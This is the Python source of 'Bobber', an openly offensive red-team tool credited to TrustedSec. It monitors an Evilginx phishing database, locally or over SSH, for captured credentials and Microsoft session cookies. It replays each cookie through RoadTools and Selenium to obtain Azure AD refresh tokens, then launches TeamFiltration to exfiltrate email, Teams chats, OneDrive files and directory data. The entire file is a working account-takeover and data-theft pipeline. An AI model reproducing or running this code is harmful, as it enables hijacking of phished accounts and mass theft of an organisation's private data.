import subprocess
import os
import argparse
import paramiko
import threading
import time
import json
import codecs
import platform
import sys
import requests
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor


#Comments, error handling and readability curtsey of everyone's favorite LLM model!


from selenium import webdriver
from seleniumwire import webdriver as webdriver_wire

# Import only necessary modules from roadtools.roadlib
from roadtools.roadlib.auth import Authentication
from roadtools.roadlib.deviceauth import DeviceAuthentication
from roadtools.roadtx.selenium import SeleniumAuthentication

# Initialize colorama for colored output
init(autoreset=True)

# Define log icons
INFO_ICON = Fore.CYAN + "[INFO]"
SUCCESS_ICON = Fore.GREEN + "[SUCCESS]"
ERROR_ICON = Fore.RED + "[ERROR]"
WARNING_ICON = Fore.YELLOW + "[WARNING]"

# Initialize the Pushover client to send notifications
pushClient = None
tfArguments = []

class PushoverClient:
    def __init__(self, user_key, api_token):
        self.user_key = user_key
        self.api_token = api_token

    def send_message(self, message, title=None):
        try:
            data = {
                "token": self.api_token,
                "user": self.user_key,
                "message": message
            }
            if title:
                data["title"] = title
            response = requests.post("https://api.pushover.net/1/messages.json", data=data)
            if response.status_code == 200:
                print("{SUCCESS_ICON} Pushover notification sent successfully!")
            else:
                print(f"{ERROR_ICON} Failed to send notification, Status Code: {response.status_code} , Response: {response.text}")
        except Exception as e:
             print(f"{ERROR_ICON} Failed to send notification {e}")

class LazySeleniumAuthentication(SeleniumAuthentication):

    def get_webdriver(self, service, intercept=False):
        '''
        Overides the original get_webdriver in order to make sure we ignore any TLS errors/ trustissues
        Load webdriver based on service, which is either
        from selenium or selenium-wire if interception is requested
        '''

        options = {'request_storage': 'memory'}
        if intercept and self.headless:
            firefox_options=self.FirefoxOptions()
            firefox_options.add_argument("-headless")
            driver = webdriver_wire.Firefox(service=service,  options=firefox_options, seleniumwire_options=options)
        elif intercept:
            seleniumwireOptions = {}
            seleniumwireOptions['desired_capabilities'] = {
                'acceptInsecureCerts': True
            }
            driver = webdriver_wire.Firefox(service=service, seleniumwire_options=seleniumwireOptions)
        else:
            driver = webdriver.Firefox(service=service)
        return driver

def is_teamfiltration_present():
    """
    Checks if the TeamFiltration binary is present in the system PATH or current directory.

    Returns:
        bool: True if TeamFiltration is found and executable, False otherwise.
    """
    # Construct the basic binary name depending on the operating system
    binary_name = "TeamFiltration"
    if platform.system() == "Windows":
        binary_name += ".exe"
    
    # Check if the binary is in the current directory and executable
    if os.path.isfile(binary_name) and os.access(binary_name, os.X_OK):
        return True
    
    # Check system PATH for the binary
    system_path = os.environ.get("PATH", "")
    for directory in system_path.split(os.pathsep):
        binary_path = os.path.join(directory, binary_name)
        if os.path.isfile(binary_path) and os.access(binary_path, os.X_OK):
            return True
    
    # Binary not found in PATH or current directory
    return False

def extract_valid_jsons(filename):
    """
    Extracts valid JSON objects from a file where each line is a separate JSON object.

    Args:
        filename (str): The path to the file containing potential JSON strings.
    Returns:
        list: A list of dictionaries representing valid JSON objects.
    """
    valid_jsons = []
    try:
        # Open the file and read the lines
        with open(filename, 'r') as file:
            lines = file.readlines()
        
        for line in lines:
            try:
                # Attempt to parse each line as a JSON object
                parsed_json = json.loads(line.strip())
                valid_jsons.append(parsed_json)
            except json.JSONDecodeError:
                # Ignore lines that are not valid JSON
                continue
    except FileNotFoundError:
        print(f"{ERROR_ICON} The file '{filename}' was not found.")
    except IOError as e:
        print(f"{ERROR_ICON} An I/O error occurred while reading '{filename}': {e}")
    
    return valid_jsons

def is_gecko_driver_present(geckoDriverPath):
    """
    Checks if the geckodriver specified by the path is present and executable.

    Args:
        geckoDriverPath (str): The path to the geckodriver.

    Returns:
        bool: True if geckodriver is found and executable, False otherwise.
    """
    try:
        # Use LazySeleniumAuthentication to check for geckodriver
        selauth = LazySeleniumAuthentication(None, None, None, None)
        service = selauth.get_service(geckoDriverPath)
        if service:
            return True
    except Exception as e:
        print(f"{ERROR_ICON} An unexpected error occurred when checking for gecko driver: {e}")
    
    # If the function hasn't returned True, assume the geckodriver isn't present
    return False

def download_remote_file(ssh, remote_file, local_file):
    try:
        sftp = ssh.open_sftp()
        sftp.get(remote_file, local_file)
        sftp.close()
        print(f"{INFO_ICON} File '{remote_file}' successfully downloaded as '{local_file}'.")
    except Exception as e:
        print(f"{ERROR_ICON} Failed to download file: {e}")

def execute_authentication(estscookie, username, resourceUri, clientId, redirectUrl, geckoDriverPath, keepOpen, tfArguments=None):
    # Attempt to execute the authentication process
    try:
        # Informing the user about the start of the process
        print(f"{INFO_ICON} Using RoadTools to retrieve JWT tokens for {username}")
        
        # Initialize authentication objects
        deviceAuthObject = DeviceAuthentication()
        authObject = Authentication()

        # Set parameters for the authentication object
        authObject.set_client_id(clientId)
        authObject.set_resource_uri(resourceUri)
        authObject.verify = False
        authObject.tenant = None

        # Disable SSL verification for device authentication
        deviceAuthObject.verify = False
        
        # Initialize lazy selenium authentication object
        selAuthObject = LazySeleniumAuthentication(authObject, deviceAuthObject, redirectUrl, None)
       
        # Build the authentication URL
        authUrl = authObject.build_auth_url(redirectUrl, 'code', None)

        # Get the selenium service based on the gecko driver path
        selAuthService = selAuthObject.get_service(geckoDriverPath)
        if not selAuthService:
            print(f"{ERROR_ICON} Selenium service could not be started.")
            return None

        # Get the selenium webdriver
        selAuthObject.driver = selAuthObject.get_webdriver(selAuthService, intercept=True)
        
        # Perform login using selenium with the provided ESTSCookie
        jsonTokenObject = selAuthObject.selenium_login_with_estscookie(authUrl, None, None, None, keepOpen, False, estscookie=estscookie)
  
        # Extract the refresh token from the response
        refreshToken = jsonTokenObject.get("refreshToken")
        if refreshToken:
            print(f"{SUCCESS_ICON} Got Refresh token: {refreshToken[:30]}....")
        else:
            print(f"{ERROR_ICON} No refresh token found in the response from RoadTools")
            return None
        
        # Save the token to a file after sanitizing the username for safe file naming
        safeUserName = username.replace('@','_').replace('.','_')
        outfilePath = f"{safeUserName}_roadtools_auth"
        with codecs.open(outfilePath, 'w', 'utf-8') as outfile:
            json.dump(jsonTokenObject, outfile)

        print(f'{INFO_ICON} Tokens were written to {outfilePath}')
    
        # Additional functionality to use TeamFiltration if present
        if is_teamfiltration_present():
            # Construct the binary name based on the operating system
            binary_name = "TeamFiltration"
            if platform.system() == "Windows":
                binary_name += ".exe"
            
            # Build the command line for TeamFiltration if arguments are provided
            if tfArguments:
                commandLine = f"{binary_name} --outpath {safeUserName} --roadtools {outfilePath} --exfil"
                commandLine += " ".join(tfArguments)
                print(f"{INFO_ICON} Executing: {commandLine}")
                # Execute the TeamFiltration command
                process = subprocess.Popen(commandLine,  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                
                # Read and display the output line by line
                for line in iter(process.stdout.readline, ''):
                    print(line.strip())

                # Wait for the process to finish and get the output
                stdout, stderr = process.communicate()
                if stdout:
                    print(stdout.strip())
                if stderr:
                    print(stderr.strip(), file=sys.stderr)

    # Catch any exception that was not explicitly handled above
    except Exception as e:
        print(ERROR_ICON + f"Error using RoadTools: {e}")
        return

def process_combinations(valid_json_objects, processed_combinations):
    unique_combinations = {}

    for obj in valid_json_objects:
        try:
            username = obj.get("username", "")
            password = obj.get("password", "")
            if username and password:
                tokens = obj.get("tokens", {})
                for token in tokens.values():
                    #This can be updated and/changed to hit another or multiple cookies
                    tokenData = token.get("ESTSAUTHPERSISTENT", {}).get("Value", "")
                    if tokenData:
                        key = f"{username}:{password}"
                        if key not in processed_combinations:
                            unique_combinations[key] = tokenData
                            print(f"{SUCCESS_ICON} Found session with captured cookie for : {username}")
                            processed_combinations.add(key)
                            
                            if pushClient is not None:
                                pushClient.send_message(
                                    f"A set of credentials and session cookies have been captured for the user {username}"
                                    , title="Bobber alert, new session!")
        except Exception as e:
            pass

    return unique_combinations


def monitor_remote_database(remote_info, processed_combinations, args):
    with paramiko.SSHClient() as ssh:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(remote_info['host'], port=remote_info['port'], username=remote_info['username'], password=remote_info['password'], key_filename=remote_info['key'])
        except paramiko.AuthenticationException:
            print(f"{ERROR_ICON} SSH authentication failed. Please check your credentials.")
            return
        except paramiko.SSHException as e:
            print(f"{ERROR_ICON} SSH error: {e}")
            return

        previous_mtime = None

        local_file = f"{remote_info['host'].replace('.', '_')}_{os.path.basename(remote_info['remote_path'])}"

        while True:
            try:
                sftp = ssh.open_sftp()
                remote_file_stat = sftp.stat(remote_info['remote_path'])
                sftp.close()

                if previous_mtime is None or remote_file_stat.st_mtime > previous_mtime:
                    previous_mtime = remote_file_stat.st_mtime
                 
                    download_remote_file(ssh, remote_info['remote_path'], local_file)
                    valid_json_objects = extract_valid_jsons(local_file)
                    new_combinations = process_combinations(valid_json_objects, processed_combinations)
                    for key, tokenData in new_combinations.items():
                        with ThreadPoolExecutor() as executor:
                            executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.keep_open)
                          
            except Exception as e:
                print(f"{ERROR_ICON} Error monitoring remote file: {e}")

            time.sleep(5)

if __name__ == "__main__":
    # ASCII Banner
    banner = """                                        
                                         ▓▓                                                         
                                         ▓▓▓                                                        
                                          ▓▓                                                        
                                          ▓▓▓                                                       
                                           ▓▓                                                       
                                           ▓▓▓                                                      
                                            ▓▓                                                      
                                            ▓▓▓                                                     
                                             ▓▓                                                     
                                             ▓▓▓                                                    
                           ░░░░░░░░░░░░░░░░░░█▓▓▓▓▓░░░░░░░░░░░░░                                    
                 ░░░░░░░░                   ▓▓▓█▓▓▓▓▓             ░░░░░░░░                          
           ░░░░░░             ░░░░░░░░░░░░░▓▓▓▓▓▓█▓█▓▓▓░░░░░░             ░░░░░░                    
      ░░░░░░          ░░░░░░               ▓▓█▓▓▓▓▓▓▓▓▓▓       ░░░░░░           ░░░░░               
   ░░░░░         ░░░░░           ░░░░░░░░░░▓▓▓▓█▓▓▓▓█▓▓▓░░           ░░░░░         ░░░░░            
 ░░░░░        ░░░░░         ░░░░░          ▓█▓▓▓▓█▓▓▓▓█▓▓ ░░░░░         ░░░░░        ░░░░░          
░░░░░        ░░░░        ░░░░░          ░░░▒▓▓▓▓▓▓▓▓█▓▓▓▓    ░░░░░        ░░░░        ░░░░░         
░░░░        ░░░░░        ░░░░          ░░░ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ░░░░        ░░░░░        ░░░░       
 ░░░░        ░░░░░        ░░░░░         ░░░░░▒▒▒▒▒▒▒▒▒▒▒  ░░░░░░         ░░░░░        ░░░░      
  ░░░░░        ░░░░░         ░░░░            ░░░░░░         ░░░░░        ░░ 
    ░░░░░         ░░░░░           ░░░░░░░░        ░░░░░░░░           ░░░░░         ░░░   
                                                                        
                                Bobber - Bounces when a fish bites!
                                v0.1 - @flangvik @TrustedSec
                                Uses RoadTools by @_dirkjan
    """
    print(Fore.CYAN + banner)

    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("database_path", help="Path to the local OR remote Evilginx database file.")

    ssh_group = arg_parser.add_argument_group('SSH Options', 'Evilginx database monitoring SSH options')
    ssh_group.add_argument("--host", help="SSH hostname/IP when fetching from a remote host.")
    ssh_group.add_argument("--port", type=int, default=22, help="SSH port when fetching from a remote host.")
    ssh_group.add_argument("--username", help="SSH username when fetching from a remote host.", default="root")
    ssh_group.add_argument("--password", help="SSH password when fetching from a remote host.", required=False)
    ssh_group.add_argument("--key", default=os.path.expanduser("~/.ssh/id_rsa"), help="Path to the SSH private key file for authentication.")

    pushover_group = arg_parser.add_argument_group('Pushover Options', 'Pushover notifications options')
    pushover_group.add_argument('--user-key', type=str, required=False, help='Pushover User Key')
    pushover_group.add_argument('--api-token', type=str, required=False, help='Pushover API Token')

    teamfiltration_group = arg_parser.add_argument_group('TeamFiltration Options', 'Exfiltration options for TeamFiltration')
    teamfiltration_group.add_argument('--all', action='store_true', help='Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)')
    teamfiltration_group.add_argument('--aad', action='store_true', help='Exfiltrate information from Graph API (domain users and groups)')
    teamfiltration_group.add_argument('--teams', action='store_true', help='Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)')
    teamfiltration_group.add_argument('--onedrive', action='store_true', help='Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the user\'s entire OneDrive directory)')
    teamfiltration_group.add_argument('--owa', action='store_true', help='Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received)')
    teamfiltration_group.add_argument('--owa-limit', type=int, help='Set the max amount of emails to exfiltrate, default is 2k.')

    
    roadtools_group = arg_parser.add_argument_group('RoadTools Options', description='RoadTools RoadTX interactive authentication options')
    roadtools_group.add_argument('-c','--client',action='store',help="Client ID (application ID / GUID ) to use when authenticating (Teams Client by default)",default='1fec8e78-bce4-4aaf-ab1b-5451cc387264')
    roadtools_group.add_argument('-r','--resource',action='store',help='Resource to authenticate to. Either a full URL or alias (list with roadtx listaliases)',default='https://graph.windows.net')
    roadtools_group.add_argument('-s','--scope',action='store',help='Scope to use. Will automatically switch to v2.0 auth endpoint if specified. If unsure use -r instead.')
    roadtools_group.add_argument('-ru', '--redirect-url', action='store', metavar='URL',help='Redirect URL used when authenticating (default: https://login.microsoftonline.com/common/oauth2/nativeclient)',default="https://login.microsoftonline.com/common/oauth2/nativeclient")
    roadtools_group.add_argument('-t','--tenant',action='store',help='Tenant ID or domain to auth to',required=False)
    roadtools_group.add_argument('-d', '--driver-path',action='store',help='Path to geckodriver file on disk (download from: https://github.com/mozilla/geckodriver/releases)',default='geckodriver.exe')
    roadtools_group.add_argument('-k', '--keep-open', action='store_true', help='Do not close the browser window after timeout. Useful if you want to browse online apps with the obtained credentials')
    
    args = arg_parser.parse_args()
    processed_combinations = set()

    if not is_gecko_driver_present(args.driver_path):
        exit(0)
    
    if args.user_key and args.api_token:
        pushover_configured=True
        pushClient = PushoverClient(args.user_key, api_token=args.api_token)
        print("{INFO_ICON} Pushover notifications activated!")

    if args.all:
        tfArguments.append('--all')
    else:
        if args.aad:
            tfArguments.append('--aad')
        if args.teams:
            tfArguments.append('--teams')
        if args.onedrive:
            tfArguments.append('--onedrive')
        if args.owa:
            tfArguments.append('--owa')
    
    if args.owa_limit:
        tfArguments.append(f'--owa-limit {args.owa_limit}')

    if args.host:
        remote_info = {
            'host': args.host,
            'port': args.port,
            'username': args.username,
            'password': args.password,
            'key': args.key,
            'remote_path': args.database_path
        }
        print(f"{INFO_ICON} SSH is enabled for remote database access. Starting to monitor the remote database file...")
        monitor_remote_database(remote_info, processed_combinations, args)
    else:
        print(f"{INFO_ICON} SSH is not enabled. Monitoring local database file {args.database_path}")
        while True:
            valid_json_objects = extract_valid_jsons(args.database_path)
            initial_combinations = process_combinations(valid_json_objects, processed_combinations)
            for key, tokenData in initial_combinations.items():
                with ThreadPoolExecutor() as executor:
                    executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.keep_open)
            time.sleep(5000)
